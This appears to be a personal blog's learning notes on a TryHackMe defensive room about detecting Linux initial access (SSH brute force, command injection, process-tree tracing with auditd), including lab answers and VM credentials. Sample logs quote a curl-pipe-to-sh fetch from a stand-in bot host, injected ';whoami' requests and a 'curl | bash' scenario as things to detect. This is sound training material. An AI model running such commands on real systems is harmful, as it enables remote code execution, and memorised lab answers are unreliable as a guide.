---
layout: post
title: "TryHackMe  - Linux Threat Detection 1"
date: 2026-02-01
tags: ["tryhackme"]
categories: [tryhackme]
hubs: "TryHackMe/SOC Level 1/Linux Security Monitoring"
identifier: "20260201T000000"
source_urls: "(https://tryhackme.com/room/linuxthreatdetection1)"
source_path: "SOC Level 1/Linux Security Monitoring/20260201T000000--tryhackme-linux-threat-detection-1__learning_notes_tryhackme.md"
---

{% raw %}


# TryHackMe | Linux Threat Detection 1

## Task 1 | Introduction

With the rise of AI, cloud computing, and the Internet of Things, Linux systems are getting even more popular than before. However, most Linux breaches still start with common, well-known Initial Access techniques. In this room, you will explore how to detect these techniques using the log sources you learned in the [Linux Logging for SOC](https://tryhackme.com/room/linuxloggingforsoc) room.

 Learning Objectives 
- Understand the role and risk of SSH in Linux environments
- Learn how Internet-exposed services can lead to breaches
- Utilize process tree analysis to identify the origin of the attack
- Practice detecting Initial Access techniques in realistic labs

 Prerequisites 
- Complete the [Linux Logging for SOC](https://tryhackme.com/room/linuxloggingforsoc) room
- Understand the concept of [MITRE](https://tryhackme.com/room/mitre) tactics and techniques
- Know how to navigate Linux without using a GUI
- Be ready for a deep dive into Linux threat detection

 Lab Access Before moving forward, start the lab by clicking the **Start Machine**  button below. The machine will start in split view and will take about two minutes to load. In case the machine is not visible, you can click the **Show Split View**  button at the top of the task. You may need to work as the root user for some tasks. To switch to root on the VM, please run `sudo su`.

 Your virtual environment has been set upAll machine details can be found at the top of the page.

![Image 1](https://tryhackme.com/static/svg/target-machine.a3955286.svg)

Target machine

![Image 2](data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTciIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNyAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTguODI1MiAwQzQuNDA2NDUgMCAwLjgyNTE5NSAzLjU4MTI1IDAuODI1MTk1IDhDMC44MjUxOTUgMTIuNDE4NyA0LjQwNjQ1IDE2IDguODI1MiAxNkMxMy4yNDM5IDE2IDE2LjgyNTIgMTIuNDE4NyAxNi44MjUyIDhDMTYuODI1MiAzLjU4MTI1IDEzLjI0MzkgMCA4LjgyNTIgMFpNOC44MjUyIDRDOS4zNzczOCA0IDkuODI1MiA0LjQ0NzgxIDkuODI1MiA1QzkuODI1MiA1LjU1MjE5IDkuMzc3MzggNiA4LjgyNTIgNkM4LjI3MzAxIDYgNy44MjUyIDUuNTUzMTIgNy44MjUyIDVDNy44MjUyIDQuNDQ2ODggOC4yNzIwNyA0IDguODI1MiA0Wk0xMC4wNzUyIDEySDcuNTc1MkM3LjE2MjcgMTIgNi44MjUyIDExLjY2NTYgNi44MjUyIDExLjI1QzYuODI1MiAxMC44MzQ0IDcuMTYxMTMgMTAuNSA3LjU3NTIgMTAuNUg4LjA3NTJWOC41SDcuODI1MkM3LjQxMTEzIDguNSA3LjA3NTIgOC4xNjQwNiA3LjA3NTIgNy43NUM3LjA3NTIgNy4zMzU5NCA3LjQxMjcgNyA3LjgyNTIgN0g4LjgyNTJDOS4yMzkyNiA3IDkuNTc1MiA3LjMzNTk0IDkuNTc1MiA3Ljc1VjEwLjVIMTAuMDc1MkMxMC40ODkzIDEwLjUgMTAuODI1MiAxMC44MzU5IDEwLjgyNTIgMTEuMjVDMTAuODI1MiAxMS42NjQxIDEwLjQ5MDggMTIgMTAuMDc1MiAxMloiIGZpbGw9IiM4NzhGQTIiLz4KPC9zdmc+Cg==)

Status:On  Credentials

 Alternatively, you can access the VM from your own VPN-connected machine with the credentials below:

   Username    ubuntu        Password    Secure!        IP address    10.66.184.56        Connection via    SSH

### **Answer the questions below**

**Question:** 

*Answer:* 

     No answer needed

---

## Task 2 | Initial Access via SSH

Popularity of SSH One of the most popular Initial Access methods on Linux servers is an exposed SSH, a common remote access service used by IT teams worldwide. Nearly every Internet-facing Linux machine has SSH enabled, with Shodan reporting [over 40 million](https://www.shodan.io/search?query=ssh) machines in 2025. Only some administrators enforce a secure [key-based](https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server) authentication, while others still rely on weak passwords and leave their systems vulnerable to brute-force attacks.

 ![Image 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1755532147638.png)

 Initial Access via SSH Much like with RDP on Windows, SSH is both powerful and often poorly defended - in fact, both protocols are tracked under the [External Remote Services](https://attack.mitre.org/techniques/T1133/) MITRE technique. A lot of threat groups run vast botnets to scan the Internet for systems with exposed SSH and access them in two primary ways: via a stolen key or a breached password. Let's see how it usually happens:

 
1. **Common risks when using key-based authentication:**

 
- Threat actors access a service or source code where private SSH keys have been stored
(Like a GitHub repository or Ansible automation server containing SSH credentials)
- Threat actors steal SSH keys to a server by infecting an admin's laptop with a data stealer
2. **Additional risks when using password-based authentication:**

 
- An IT admin sets a weak SSH password for a quick test and forgets to revert the changes
- An IT support enables SSH for a contractor who sets the password to "12345678"
- A network engineer accidentally exposes an old, insecure SSH server to the Internet

 Most real-world Linux attacks, such as those by the [Outlaw](https://thehackernews.com/2025/04/outlaw-group-uses-ssh-brute-force-to.html#:~:text=Outlaw%20is%20a%20Linux%20malware%20that%20relies%20on%20SSH%20brute%2Dforce%20attacks) group, start from one of the scenarios above. However, you should also be aware of more advanced risks like a vulnerability in the SSH server itself, notably [Erlang/OTP](https://tryhackme.com/room/erlangotpsshcve202532433) or SSH [session hijacking](https://attack.mitre.org/techniques/T1563/001/), that you will learn in more advanced rooms.

  For this task, open the VM and remind yourself how to work with SSH logs.
You can start from:**cat /var/log/auth.log | grep "sshd"**

### **Answer the questions below**

**Question:** 

*Answer:* 

     2024-10-22

**Question:** 

*Answer:* 

     Yea

---

## Task 3 | Detecting SSH Attacks

SSH Breach Example Now, imagine a common real-world scenario: An IT administrator enables **public** SSH access to the server, allows **password-based** authentication, and sets a **weak** password for one of the support users. Combined, these three actions inevitably lead to an SSH breach, as it's a matter of time before threat actors guess the password. The log sample below shows such a compromise: A brute force followed by a password breach. There are three indicators of malicious logins to pay attention to:

 ![Image 4](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1755735899575.svg)

 Detecting SSH Attacks On Linux, you don't need to learn a dozen fields like logon type to figure out what's going on, making log analysis more straightforward. Your starting point in detecting SSH attacks can be as simple as listing all successful SSH logins and analyzing a few fields. Let's imagine you queried the logs and found three successful SSH logins, each of which could indicate an attack. How would you distinguish bad from good?

   Successful SSH Logins 
```Successful SSH Logins 
ubuntu@thm-vm:~$ cat /var/log/auth.log | grep -E 'Accepted'
2025-08-19T14:00:02 thm-vm sshd[1013]: Accepted publickey for ansible from 10.14.105.255 port 18442 ssh2: [...]
2025-08-20T12:56:49 thm-vm sshd[2830]: Accepted password for jsmith from 54.155.224.201 port 51058 ssh2
2025-08-22T03:14:06 thm-vm sshd[2830]: Accepted password for jsmith from 196.251.118.184 port 51058 ssh2
```

   **Login of Ansible**

 The first login appears legitimate: It used public-key authentication from an internal IP, likely an Ansible automation account. Moreover, the login at exactly 14:00 matches periodic task behavior. But to be sure, you'd still need to verify that `10.14.105.255` is an Ansible server and review the following user's activity for signs of a breach.

 **Logins of Jsmith**

 The two logins of jsmith are more interesting, as there are three red flags: Password-based authentication, logins from external IPs, and time difference between the logins (one of the logins must be at night for the user, right?). Still, to make a final verdict, you might need to investigate more details:

 
- **Username** : Who owns the user? Is it expected for them to log in at this time and from this IP?
- **Source IP** : What do [TI tools](https://tryhackme.com/room/ipanddomainthreatintel) and [asset lookups](https://tryhackme.com/room/socworkbookslookups) say about the IP? Is it trusted or malicious?
- **Login history** : Was the login preceded by brute force or other suspicious system events?
- **Next steps** : Is the login suspicious? Should I analyze user actions following the login?

  Now, try to uncover the breach that started via SSH password brute force!
For this task, continue with the**/var/log/auth.log**  on the VM.

### **Answer the questions below**

**Question:** 

*Answer:* 

     2025-08-21

**Question:** 

*Answer:* 

     root, roy, sol, user

**Question:** 

*Answer:* 

     91.224.92.79

---

## Task 4 | Initial Access via Services

Linux and Public Services Linux systems often host public-facing services or applications such as web servers, email servers, databases, and various development or IT management tools. They also comprise the core of most firewall or VPN software. However, whenever one of these applications is compromised, the entire Linux host is at risk. This risk is covered with the [T1190](https://attack.mitre.org/techniques/T1190/) MITRE technique. Let's see a few real-world examples:

 
- [CVE in Zimbra Collaboration](https://thehackernews.com/2024/10/researchers-sound-alarm-on-active.html): Allowed the attackers to execute arbitrary OS commands
- [Exposed Docker API port](https://www.aquasec.com/blog/threat-alert-teamtnts-docker-gatling-gun-campaign/#:~:text=The%20campaign%20gains%20initial%20access%20by%20exploiting%20exposed%20Docker%20daemons): Acted as an entry point in a series of cloud infrastructure breaches
- [CVE in Palo Alto firewalls](https://unit42.paloaltonetworks.com/cve-2024-3400/): Granted attackers full control over the Linux-based firewall's OS
- [WordPress "plugins" feature](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/): Often abused to upload malware like web shells to the system

 ![Image 5](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1756147703303.svg)

 Using Application Logs If you want to know whether your email server was breached, you naturally reach for the email logs. On the other hand, can you expect an application to log "I am being exploited with a zero-day right now"? Of course not. That’s the nature of application logs - they rarely tell the full story, but they can still provide unique artifacts for analysis. For example, you can:

 
- Use **web logs**  to detect a variety of web attacks
- Use **database logs**  to detect suspicious SQL queries
- Use **VPN logs**  to detect abnormal VPN login events
- Refer to **other logs**  for specific events like bank transactions

 Web as Initial Access Any publicly exposed application can lead to a Linux breach, especially vulnerable web servers. Let's see an example: The IT team creates a simple web application called TryPingMe, where you can ping the specified IP online. Internally, the app runs a system command `ping -c 2 [YOUR-INPUT]` to test the connection, without any input filtering. The attackers would easily spot a [command injection](https://tryhackme.com/room/oscommandinjection) there, but can you spot the exploitation in the TryPingMe web logs?

   TryPingMe Web Logs 
```TryPingMe Web Logs 
ubuntu@thm-vm:~$ cat /var/log/nginx/access.log
10.2.33.10 - - [19/Aug/2025:12:26:07] "GET /ping?host=3.109.33.76 HTTP/1.1" 200 [...]
10.12.88.67 - - [23/Aug/2025:09:32:22] "GET /ping?host=54.36.19.83 HTTP/1.1" 200 [...]
10.14.105.255 - - [26/Aug/2025:20:09:43] "GET /ping?host=hello HTTP/1.1" 500 [...]
10.14.105.255 - - [26/Aug/2025:20:09:46] "GET /ping?host=whoami HTTP/1.1" 500 [...]
10.14.105.255 - - [26/Aug/2025:20:09:49] "GET /ping?host=;whoami HTTP/1.1" 200 [...]
10.14.105.255 - - [26/Aug/2025:20:10:41] "GET /ping?host=;ls HTTP/1.1" 200 [...]
```

   **Web Logs Analysis**

 The requests coming from `10.14.105.255` seem odd. Instead of IPs, the client puts Linux commands inside the query parameters - a clear sign of command injection! Although now you will need to start a deep investigation to unravel the whole story, from web logs alone you can assume that:

 
- `10.14.105.255` is likely the attacker's IP
- The `/ping` page is vulnerable and allows code execution
- The attacker executed OS commands like `whoami` and `ls`
- The entire system is now at risk because of the TryPingMe vulnerability

  Can you analyse TryPingMe web logs to detect the attacker's actions?
Use **/var/log/nginx/access.log**  on the VM to answer the questions.

### **Answer the questions below**

**Question:** 

*Answer:* 

     /opt/trypingme/main.py

**Question:** 

*Answer:* 

     THM{i_am_vulnerable!}

---

## Task 5 | Detecting Service Breach

Building Process Tree One way to detect a service breach is to use application logs, like you did in the previous task. But remember, application logs are not always available or helpful. Instead, most SOC teams rely on **process tree analysis**  - a universal approach to unwrapping the Initial Access. For example, in [this report](https://www.wiz.io/blog/seleniumgreed-cryptomining-exploit-attack-flow-remediation-steps#:~:text=Below%20is%20the%20exploit%20process%20tree%3A%C2%A0), Wiz used a process tree to visually highlight how exactly Selenium servers were breached and how to spot it in process creation logs.

 A common SOC scenario is when you receive an alert about a suspicious command, let's say `whoami`. Why was it executed - due to IT activity, or maybe a service breach? To answer this, all you need is to build a process tree and trace the command back to its parent process, as shown in the image below:

 ![Image 6](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1757531453793.svg)

 Auditd and Process Tree Continuing the example, you begin by locating the suspicious command in the logs with `ausearch -i -x whoami`. Next, you walk up the process tree using the `--pid` option until you reach PID 1, the OS process. The tree eventually shows that `whoami` was launched by a Python web application (`/opt/mywebapp/app.py`). This immediately raises the question: Was the application breached and used as an entry point?

   Tracing Whoami Origin 
```Tracing Whoami Origin 
ubuntu@thm-vm:~$ ausearch -i -x whoami # -x filters the results by the command name
type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : syscall=execve success=yes exit=0 items=2 ppid=3905 pid=3907 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/whoami key=exec

ubuntu@thm-vm:~$ ausearch -i --pid 3905 # 3905 is a parent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
type=SYSCALL msg=audit(08/25/25 16:28:17.101:983) : syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3905 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/dash key=exec

ubuntu@thm-vm:~$ ausearch -i --pid 3898 # 3898 is a grandparent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/python3 /opt/mywebapp/app.py
type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : syscall=execve success=yes exit=0 items=2 ppid=1 pid=3898 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/python3.12 key=exec
```

   Next, you might wonder if `whoami` is simply part of the application's normal behavior. Maybe so, but that question would require web logs analysis, external research, or communication with the developers. What you can do instead is use the process tree to look for other, more dangerous commands launched by the app. By listing all child processes of `/opt/mywebapp/app.py`, you may find clearer evidence of the app's breach, like a malicious curl command!

   Listing All Child Processes 
```Listing All Child Processes 
ubuntu@thm-vm:~$ ausearch -i --ppid 3898 | grep 'proctitle' # Use grep for a simpler output
type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
type=PROCTITLE msg=audit(08/25/25 16:28:18.230:985) : proctitle=/bin/sh -c ls -la
type=PROCTITLE msg=audit(08/25/25 16:28:19.765:987) : proctitle=/bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh[...]
```

    Now let's look at the TryPingMe breach from the previous task through the auditd angle!
Use **ausearch**  and the examples from the tasks to uncover the full picture.

### **Answer the questions below**

**Question:** 

*Answer:* 

     1018

**Question:** 

*Answer:* 

     577

**Question:** 

*Answer:* 

     Python

---

## Task 6 | Advanced Initial Access

Human-Led Attacks In the previous tasks, you explored Initial Access via SSH and exposed services. But what about phishing and USB attacks, so commonly seen in Windows environments? Since Linux primarily is a server OS operated by technical people, it is harder to trick system owners into running phishing malware or inserting a malicious USB. Still, the risk remains, for example:

    Scenario Example Consequences   An IT member looks for a solution to a server issue and desperately tries this script found in a forum: `curl https://shadyforum.thm/fix.sh | bash` The IT member didn't check the script content, and it appeared to be malware, silently infecting the server ([Read more](https://www.schneier.com/blog/archives/2022/11/an-untrustworthy-tls-certificate-in-browsers.html))   A developer wants to install a Python "fastapi" package on the server, but mistypes a single letter: `pip3 install fastpi` The mistyped package was malware, deliberately prepared and published by threat actors ([Real-world case](https://thehackernews.com/2025/03/malicious-pypi-packages-stole-cloud.html))    Supply Chain Compromise While not unique to Linux, you should also be aware of [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195/). These attacks breach a software first, and then infect all its users with the malicious update. Since a typical Linux server uses hundreds of software dependencies maintained by different developers, the attack can come from anywhere, anytime. Let's see some examples:

 
- A [backdoor in the XZ Utils](https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know) library that is a part of SSH nearly led to a breach of millions of Linux servers
- A [breach of the tj-actions](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction) resulted in a leak of thousands of secrets, like SSH keys and access tokens

 Detecting the Attacks All Initial Access techniques described in this room can be uncovered through a process tree analysis. You start with a trigger, such as a SIEM alert on a suspicious command or a connection to a known malicious IP. From there, you build a process tree to trace which application or user initiated the events - a web server, an internal application, or an IT administrator’s SSH session. Finally, you determine whether the activity is legitimate or an indicator of malicious behavior:

 ![Image 7](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1757679022514.svg)

### **Answer the questions below**

**Question:** 

*Answer:* 

     Supply Chain Compromise

**Question:** 

*Answer:* 

     Process Tree Analysis

---

## Task 7 | Conclusion

Great job exploring the Initial Access techniques and an especially complex topic - the process tree analysis! While it may seem hard to apply, you will happily use it on a daily basis with some practice and a more convenient SIEM interface. Using the system log sources and auditd, you learned to identify how attacks start and are now ready to learn how they continue!

 Key Takeaways 
- Attacks on SSH are widespread, but they are easy to detect via authentication logs
- Exposed services are always a risk since they can lead to a whole Linux compromise
- Check out the [Bulletproof Penguin](https://tryhackme.com/room/bppenguin) room to learn how to harden and secure Linux servers
- While phishing is not common on Linux, human-led and supply attacks are still possible
- Process tree analysis is your best approach in identifying the Initial Access techniques

### **Answer the questions below**

**Question:** 

*Answer:* 

     No answer needed

---
{% endraw %}
